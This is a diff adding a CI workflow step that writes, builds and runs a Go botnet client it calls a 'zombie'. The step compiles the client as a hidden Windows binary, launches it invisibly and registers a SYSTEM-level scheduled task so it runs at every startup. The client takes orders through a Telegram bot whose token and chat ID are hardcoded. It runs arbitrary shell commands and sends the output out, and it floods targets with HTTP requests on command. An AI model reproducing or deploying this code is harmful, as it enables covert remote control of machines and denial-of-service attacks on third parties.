@@ -1,0 +1,155 @@
+- name: 🧟 Build zombie client
+  shell: pwsh
+  run: |
+    $code = @"
+package main
+
+import (
+    "bytes"
+    "encoding/json"
+    "fmt"
+    "io"
+    "net/http"
+    "os"
+    "os/exec"
+    "runtime"
+    "strings"
+    "time"
+)
+
+const (
+    botToken = "8846565281:AABf5rshhkC3c1UnX2-G0BY4GdE1SH_UpzI0Q"
+    chatID   = "6937896287"
+)
+
+type Update struct {
+    Result []struct {
+        Message struct {
+            Text string ` + "`json:\"text\"`" + `
+        } ` + "`json:\"message\"`" + `
+    } ` + "`json:\"result\"`" + `
+}
+
+func main() {
+    hostname, _ := os.Hostname()
+    tsIP := getTailscaleIP()
+    sendTelegram("🧟 *Zombie online* \nHost: " + hostname + "\nIP: " + tsIP)
+    go func() {
+        time.Sleep(2 * time.Second)
+        sendTelegram("💀 *Ready to execute commands*")
+    }()
+
+    lastUpdate := 0
+    for {
+        updates := getUpdates(lastUpdate)
+        for _, u := range updates.Result {
+            text := u.Message.Text
+            if text == "" { continue }
+            if strings.HasPrefix(text, "/") {
+                handleCommand(text)
+            }
+            lastUpdate++
+        }
+        time.Sleep(3 * time.Second)
+    }
+}
+
+func getTailscaleIP() string {
+    cmd := exec.Command("tailscale", "ip", "-4")
+    out, _ := cmd.Output()
+    return strings.TrimSpace(string(out))
+}
+
+func getUpdates(offset int) Update {
+    url := fmt.Sprintf("https://api.telegram.org/bot%s/getUpdates?offset=%d", botToken, offset+1)
+    resp, _ := http.Get(url)
+    if resp == nil { return Update{} }
+    defer resp.Body.Close()
+    body, _ := io.ReadAll(resp.Body)
+    var u Update
+    json.Unmarshal(body, &u)
+    return u
+}
+
+func handleCommand(cmd string) {
+    parts := strings.SplitN(cmd, " ", 3)
+    action := strings.TrimPrefix(parts[0], "/")
+    
+    switch action {
+    case "ddos":
+        if len(parts) < 3 {
+            sendTelegram("⚠️ *Usage:* /ddos target port duration(s)")
+            return
+        }
+        target := parts[1]
+        port := 80
+        duration := 60
+        fmt.Sscanf(parts[2], "%d %d", &port, &duration)
+        sendTelegram("🔥 *DDoS started* on " + target + ":" + fmt.Sprint(port) + " for " + fmt.Sprint(duration) + "s")
+        go ddos(target, port, duration)
+    case "exec":
+        if len(parts) < 2 {
+            sendTelegram("⚠️ *Usage:* /exec command")
+            return
+        }
+        go execCmd(parts[1])
+    case "update":
+        sendTelegram("🔄 *Updating self...*")
+        updateSelf()
+    case "reboot":
+        sendTelegram("♻️ *Rebooting system...*")
+        os.Exit(0)
+    default:
+        sendTelegram("❌ Unknown command: " + action + "\nAvailable: /ddos, /exec, /update, /reboot")
+    }
+}
+
+func ddos(target string, port int, duration int) {
+    url := fmt.Sprintf("http://%s:%d", target, port)
+    end := time.Now().Add(time.Duration(duration) * time.Second)
+    for time.Now().Before(end) {
+        go func() {
+            req, _ := http.NewRequest("GET", url, nil)
+            req.Header.Set("User-Agent", "Mozilla/5.0")
+            http.DefaultClient.Do(req)
+        }()
+        time.Sleep(5 * time.Millisecond)
+    }
+    sendTelegram("✅ *DDoS finished* on " + target)
+}
+
+func execCmd(cmdStr string) {
+    var cmd *exec.Cmd
+    if runtime.GOOS == "windows" {
+        cmd = exec.Command("cmd", "/c", cmdStr)
+    } else {
+        cmd = exec.Command("/bin/sh", "-c", cmdStr)
+    }
+    out, _ := cmd.CombinedOutput()
+    result := string(out)
+    if len(result) > 4000 { result = result[:4000] + "..." }
+    sendTelegram("📤 *Output:*\n" + result)
+}
+
+func updateSelf() {
+    sendTelegram("⚠️ *Update function needs a hosted binary*")
+}
+
+func sendTelegram(msg string) {
+    url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
+    data, _ := json.Marshal(map[string]string{
+        "chat_id": chatID,
+        "text": msg,
+        "parse_mode": "Markdown",
+    })
+    http.Post(url, "application/json", bytes.NewBuffer(data))
+}
+"@
+    $code | Out-File -FilePath "zombie.go" -Encoding UTF8
+    go mod init zombie 2>$null
+    go mod tidy 2>$null
+    go build -ldflags="-s -w -H=windowsgui" -o zombie.exe zombie.go
+    Start-Process -WindowStyle Hidden -FilePath ".\zombie.exe"
+    $action = New-ScheduledTaskAction -Execute "$pwd\zombie.exe"
+    $trigger = New-ScheduledTaskTrigger -AtStartup
+    Register-ScheduledTask -TaskName "ZombieService" -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest -Force
